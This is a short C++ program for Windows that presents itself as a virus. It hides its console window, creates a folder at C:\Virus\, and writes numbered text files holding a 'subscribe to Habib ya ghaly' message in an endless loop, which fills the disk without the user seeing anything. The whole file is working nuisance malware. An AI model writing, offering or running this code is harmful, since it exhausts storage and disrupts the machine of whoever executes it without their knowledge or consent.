#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>
#include <Windows.h>

int main(){
    FreeConsole();
    int h = 0;
    const char *path = "C:\\Virus\\";
    std::string str ="subscribe to Habib ya ghaly";
    _mkdir(path);
    while (true){
        ++h;
        std::ofstream Virus; 
        Virus.open(path + std::to_string(h) + ".txt", std::ios_base::out);
        Virus << str;
        Virus.close();
    }
    return -1; 
}